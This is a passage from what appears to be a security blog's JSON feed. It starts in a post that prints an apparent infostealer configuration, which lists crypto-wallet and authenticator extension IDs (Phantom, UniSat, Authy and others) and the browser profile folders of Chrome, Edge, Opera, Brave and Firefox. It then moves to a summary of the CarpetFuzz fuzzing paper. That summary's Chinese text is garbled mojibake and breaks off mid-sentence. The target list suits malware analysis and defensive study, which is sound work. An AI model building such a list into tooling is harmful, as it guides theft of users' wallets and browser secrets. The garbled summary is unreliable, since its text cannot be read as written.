class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Polymesh&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;flpiciilemghbmfalicajoolhkkenfe&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ICONex&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;nknhiehlklippafakaeklbeglecifhad&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Nabox&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;hcflpincpppdclinealmandijcmnkbgn&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;KHC&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ookjlbkiijinhpmnjffcofjonbfbgaoc&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Temple&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;mnfifefkajgofkcjkemidiaecocnkjeh&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;TezBox&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;lodccjjbdhfakaekdiahmedfbieldgik&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;DAppPlay&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ijmpgkjfkbfhoebgogflfebnmejmfbm&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;BitClip&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;lkcjlnjfpbikmcmbachjpdbijejflpcm&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Steem Keychain&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;onofpnbbkehpmmoabgpcpmigafmmnjh&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Nash Extension&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;bcopgchhojmggmffilplmbdicgaihlkp&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Hycon Lite Client&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;klnaejjgbibmhlephnhpmaofohgkpgkd&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ZilPay&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;aeachknmefphepccionboohckonoeemg&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Coin98&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;bhghoamapcdpbohphigoooaddinpkbai&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Authenticator&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;dkdedlpgdmmkkfjabffeganieamfklkm&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Cyano&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;nlgbhdfgdhgbiamfdfmbikcdghidoadd&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Byone&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;infeboajgfhgbjpjbeppbkgnabfdkdaf&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;OneKey&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cihmoadaighcejopammfbmddcmdekcje&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Leaf&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gaedmjdfmmahhbjefcbgaolhhanlaolb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Authy&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;oeljdldpnmdbchonielidgobddfffla&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;EOS Authenticator&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ilgcnhelpchnceeipipijaljkblbcob&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;GAuth Authenticator&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;imloifkgjagghnncjkhggdhalmcnfklk&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Trezor Password Manager&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;bfnaelmomeimhlpmgjnjophhpkkoljpa&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Phantom&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ppbibelpcjmhbdihakflkdcoccbgbkpo&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;UniSat&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">            <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;n&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%localappdata%\\\\Google\\\\Chrome\\\\User Data&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Chrome&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%localappdata%\\\\Chromium\\\\User Data&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Chromium&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%localappdata%\\\\Microsoft\\\\Edge\\\\User Data&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Edge&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%localappdata%\\\\Kometa\\\\User Data&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Kometa&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Opera Software\\\\Opera Stable&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Opera Stable&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Opera Software\\\\Opera GX Stable&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Opera GX Stable&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Opera Software\\\\Opera Neon\\\\User Data&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Opera Neon&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%localappdata%\\\\BraveSoftware\\\\Brave-Browser\\\\User Data&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Brave Software&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%localappdata%\\\\Comodo\\\\Dragon\\\\User Data&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Comodo&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%localappdata%\\\\CocCoc\\\\Browser\\\\User Data&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;CocCoc&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">            <span class=\"punctuation\">]</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Mozilla\\\\Firefox\\\\Profiles&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Mozilla Firefox&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "http://cubicy.icu/carpet-fuzz/",
            "url": "http://cubicy.icu/carpet-fuzz/",
            "title": "è®ºæ–‡ç²¾ç‚¼ï¼šCarpetFuzz",
            "date_published": "2023-09-22T11:24:29.000Z",
            "content_html": "<h1 id=\"è®ºæ–‡ç²¾ç‚¼ï¼šCarpetFuzz\"><a href=\"#è®ºæ–‡ç²¾ç‚¼ï¼šCarpetFuzz\" class=\"headerlink\" title=\"è®ºæ–‡ç²¾ç‚¼ï¼šCarpetFuzz\"></a>è®ºæ–‡ç²¾ç‚¼ï¼šCarpetFuzz</h1><h1 id=\"CarpetFuzz\"><a href=\"#CarpetFuzz\" class=\"headerlink\" title=\"CarpetFuzz\"></a>CarpetFuzz</h1><h2 id=\"Automatic-Program-Option-Constraint-Extraction-from\"><a href=\"#Automatic-Program-Option-Constraint-Extraction-from\" class=\"headerlink\" title=\"Automatic Program Option Constraint Extraction from\"></a>Automatic Program Option Constraint Extraction from</h2><p>Documentation for Fuzzing</p>\n<h2 id=\"æ ¸å¿ƒIdea\"><a href=\"#æ ¸å¿ƒIdea\" class=\"headerlink\" title=\"æ ¸å¿ƒIdea\"></a>æ ¸å¿ƒIdea</h2><p>ç°ä»£çš„å¤§è§„æ¨¡è½¯ä»¶é¡¹ç›®å¾€å¾€å­˜åœ¨å¤§é‡ç¨‹åºé€‰é¡¹ã€‚æœ‰äº›æ¼æ´éœ€è¦ç‰¹å®šå‚æ•°çš„ç»„åˆè§¦å‘ã€‚ç„¶è€Œæˆ‘ä»¬ä¸èƒ½ç®€å•åœ°ç©·ä¸¾è¿™äº›å‚æ•°çš„æ’åˆ—ç»„åˆï¼Œå› ä¸ºè¿™ä¼šå¯¼è‡´å·¥ä½œé‡æŒ‡æ•°çº§åˆ«çš„è†¨èƒ€ã€‚æˆ‘ä»¬æ³¨æ„åˆ°è®¸å¤šå‚æ•°ä¹‹é—´å­˜åœ¨äº’æ–¥ã€ä¾èµ–ç­‰å…³ç³»ï¼Œè€Œè¿™äº›å…³ç³»æ­£è®°å½•åœ¨Manualä¸­ã€‚å› æ­¤æœ¬ç¯‡æ–‡ç« é€šè¿‡NLPçš„æ‰‹æ®µä»æ–‡æ¡£ä¸­æå–å‚æ•°å…³ç³»å¹¶åº”ç”¨äºFuzzingï¼ˆåŸºäºAFLï¼‰ä¸­ï¼ˆåä¸ºCarpetFuzzï¼Œ<strong>å¼€æº</strong>ï¼‰ã€‚</p>\n<p>å…³é”®å‚æ•°ï¼š</p>\n<p>å‚æ•°ç»„åˆå‡†ç¡®æ€§ï¼ŸPrecision: 96.10%  Recall: 88.85%</p>\n<p>å’Œæš´åŠ›æ’åˆ—ç›¸æ¯”å‡å°‘çš„å·¥ä½œé‡ï¼Ÿ68%</p>\n<p>å’Œä¸€èˆ¬çš„Fuzzç›¸æ¯”ï¼Œé¢å¤–çš„è·¯å¾„ï¼Ÿ46%</p>\n<p><strong>è¿™ç¯‡paperæ˜¯æ¯”è¾ƒå·¥ç¨‹æ€§çš„å·¥ä½œï¼Ÿ</strong></p>\n<p>ç²¾åæ‰€åœ¨æ˜¯å¯¹éšå¼çš„é€‰é¡¹å…³ç³»è¿›è¡Œæç‚¼ï¼Œè€Œæ ¸å¿ƒæ€è·¯æ˜¯æ‰¾åˆ°ä¸åŒé€‰é¡¹æè¿°ä¸­ç»“æ„ç±»ä¼¼çš„å¥å­å¯¹ï¼Œä»è€Œå¾—å‡ºä¸¤ä¸ªé€‰é¡¹çš„å†²çªå…³ç³»ã€‚</p>\n<h2 id=\"è¡Œæ–‡é€»è¾‘\"><a href=\"#è¡Œæ–‡é€»è¾‘\" class=\"headerlink\" title=\"è¡Œæ–‡é€»è¾‘\"></a>è¡Œæ–‡é€»è¾‘</h2><ul>\n<li>å¤§å‹é¡¹ç›®ï¼ˆKernel&#x2F;Apache&#x2F;â€¦ï¼‰ç»“æ„æå…¶å¤æ‚ï¼Œæ”»å‡»é¢å¹¿ï¼Œåˆ©ç”¨é“¾æ·±ã€‚äººå·¥å®¡é˜…ä»£ç å‡ ä¹å·²ç»ä¸å¯èƒ½ã€‚<strong>è‡ªåŠ¨åŒ–æ˜¯æ‰€æœ‰è½¯ä»¶æµ‹è¯•æ–¹æ³•çš„å¤§åŠ¿æ‰€è¶‹ï¼Œ</strong>åŒ…æ‹¬Fuzzåœ¨å†…çš„è‡ªåŠ¨åŒ–æŠ€æœ¯è¢«å®˜æ–¹æ¢ç´¢åº”ç”¨ã€‚</li>\n<li>å¯¹äºFuzzè€Œè¨€ï¼Œè¦†ç›–ç‡æ˜¯é‡‘æ ‡å‡†ï¼ˆä¹‹ä¸€ï¼‰ã€‚ç„¶è€Œè®¸å¤šé¡¹ç›®çš„è¦†ç›–ç‡ä¸å¤Ÿç†æƒ³ï¼Œæ–‡ç« è®¤ä¸ºå…¶ä¸­ä¸€ä¸ªåŸå› æ˜¯<strong>å¿½è§†äº†ç¨‹åºå‘½ä»¤è¡Œå‚æ•°</strong>å¯¹ç¨‹åºè¿è¡Œçš„å½±å“ã€‚æŸäº›ä»£ç å—åªæœ‰åœ¨ç‰¹å®šå‚æ•°ç»„åˆä¸‹æ‰å­˜åœ¨éå†çš„å¯èƒ½ã€‚</li>\n<li>ç„¶è€Œç®€å•çš„ç©·ä¸¾ä¸å¯è¡Œï¼šImageMagickæœ‰242ä¸ªä¸åŒçš„é€‰é¡¹ã€‚å‚æ•°çš„å¸¸è§ç»„åˆä¹Ÿè®¸æ˜¯ä¸ªå¥½æƒ³æ³•ï¼Œæ–‡ç« çš„ideaåˆ™æ˜¯åªä¿ç•™<strong>å¯è¡Œ</strong>ç»„åˆï¼Œè€Œéåƒå…ˆå‰çš„ä¸€äº›å·¥ä½œç›´æ¥æŠŠå‚æ•°çº³å…¥å˜å¼‚ã€‚</li>\n<li>éš¾ç‚¹ï¼šé€‰é¡¹é—´çš„ä¾èµ–å…³ç³»åœ¨æ–‡æ¡£ä¸­ä»¥è‡ªç„¶è¯­è¨€æè¿°ã€‚Solutionï¼š<strong>NLP</strong><ul>\n<li>åˆé’»çš„ç¤ºä¾‹ï¼ˆå¼ºcontextï¼‰<ul>\n<li>ä¾èµ–ï¼š<code>-oåœ¨-gå¯ç”¨æ—¶å°†æ·»åŠ é¢å¤–è°ƒè¯•è¾“å‡º</code></li>\n<li>å†²çªï¼š<code>xxé€‰é¡¹ä»…åœ¨æ­£å¼ç¯å¢ƒä¸­å¯ç”¨â€¦â€¦è¦åˆ‡æ¢åˆ°æ­£å¼ç¯å¢ƒè¯·ä½¿ç”¨â€”release</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"NLPå…·ä½“æ–¹æ³•\"><a href=\"#NLPå…·ä½“æ–¹æ³•\" class=\"headerlink\" title=\"NLPå…·ä½“æ–¹æ³•\"></a>NLPå…·ä½“æ–¹æ³•</h2><ol>\n<li>ç»™å®šä¸€ä¸ªç¨‹åºçš„æ–‡æ¡£</li>\n<li>CarpetFuzzè§£æâ€œOPTIONSâ€éƒ¨åˆ†æå–å‡ºæ‰€æœ‰é€‰é¡¹åŠå…¶ç›¸åº”çš„statement</li>\n<li>CarpetFuzzä½¿ç”¨æœºå™¨å­¦ä¹ æ¥ç¡®å®šstatementä¸­æ˜¯å¦å£°æ˜äº†æŸç§å…³ç³»<ol>\n<li>ç”±äºè¿™æ ·çš„statementåœ¨æ–‡æ¡£ä¸­å æ¯”å°ï¼Œæ–‡ç« ä½¿ç”¨åŸºäºç†µçš„ä¸ç¡®å®šæ€§é‡‡æ ·ï¼ˆä¸»åŠ¨å­¦ä¹ ï¼‰ï¼Œæ¥å‡å°‘äººå·¥æ ‡è®°è®­ç»ƒæ•°æ®çš„å·¥ä½œé‡ã€‚</li>\n<li>é’ˆå¯¹ä¸Šè¿°çš„éšæ™¦çš„è‡ªç„¶è¯­è¨€statementï¼Œè§£å†³æ–¹æ¡ˆæ˜¯è®©CarpetFuzzæ€»ç»“ä¸€ç³»åˆ—â€œéšå«statementâ€çš„ç‰¹å¾ï¼Œå¹¶åˆ©ç”¨NLPæ‰¾åˆ°æ»¡è¶³è¿™äº›ç‰¹å¾çš„æ‰€æœ‰<strong>â€œsentence pairsâ€</strong></li>\n</ol>\n</li>\n<li>è¿™æ ·ä¾èµ–å…³ç³»å°±å¯ä»¥è¢«ç¡®å®šï¼Œä»è€Œæ„å»ºä¸€ä¸ªä¾èµ–æ ‘</li>\n<li><strong>CarpetFuzzæ­£å‘&#x2F;åå‘éå†ä¾èµ–æ ‘ä¸­æ‰¾åˆ°ä¸å…³ç³»ç›¸å…³çš„èŠ‚ç‚¹</strong>*<ol>\n<li>ï¼ˆè¯´å®è¯æˆ‘æ²¡çœ‹æ‡‚è¿™è¾¹ï¼‰</li>\n</ol>\n</li>\n<li><strong>CarpetFuzzåŸºäºè¯­è¨€å­¦ï¼Œåˆ©ç”¨polarity-basedçš„æœ‰é™çŠ¶æ€æœºç¡®å®šå…·ä½“çš„å…³ç³»</strong>*<ol>\n<li>(å…¶å®å°±æ˜¯åŒé‡å¦å®šè¡¨è‚¯å®šè¿™ç§æ¯”è¾ƒç®€å•çš„çŠ¶æ€æœº)</li>\n</ol>\n</li>\n<li>CarpetFuzzæœ€ç»ˆå¾—ä»¥ç­›é€‰å‡ºæ‰€æœ‰å¯ç”¨å‚æ•°ç»„åˆ</li>\n</ol>\n<h2 id=\"èƒŒæ™¯å·¥ä½œ\"><a href=\"#èƒŒæ™¯å·¥ä½œ\" class=\"headerlink\" title=\"èƒŒæ™¯å·¥ä½œ\"></a>èƒŒæ™¯å·¥ä½œ</h2><p><img src=\"/carpet-fuzz/process.png\" alt=\"ç»å…¸Fuzzingæµç¨‹ï¼ŒOptioné¢„å®šä¹‰å¥½å¹¶å›ºå®šä¸å‚ä¸å®é™…æ‰§è¡Œ\" loading=\"lazy\"></p>\n<p>ç»å…¸Fuzzingæµç¨‹ï¼ŒOptioné¢„å®šä¹‰å¥½å¹¶å›ºå®šä¸å‚ä¸å®é™…æ‰§è¡Œ</p>\n<h3 id=\"å…³äºå‘½ä»¤è¡Œå‚æ•°ç›¸å…³Fuzzingçš„å…¶ä»–å·¥ä½œ\"><a href=\"#å…³äºå‘½ä»¤è¡Œå‚æ•°ç›¸å…³Fuzzingçš„å…¶ä»–å·¥ä½œ\" class=\"headerlink\" title=\"å…³äºå‘½ä»¤è¡Œå‚æ•°ç›¸å…³Fuzzingçš„å…¶ä»–å·¥ä½œ\"></a>å…³äºå‘½ä»¤è¡Œå‚æ•°ç›¸å…³Fuzzingçš„å…¶ä»–å·¥ä½œ</h3><p><code>AFLargv</code>ï¼šé™åˆ¶å‘½ä»¤è¡Œå‚æ•°çš„æ•°é‡å’ŒèŒƒå›´ï¼›</p>\n<p>Songç­‰ 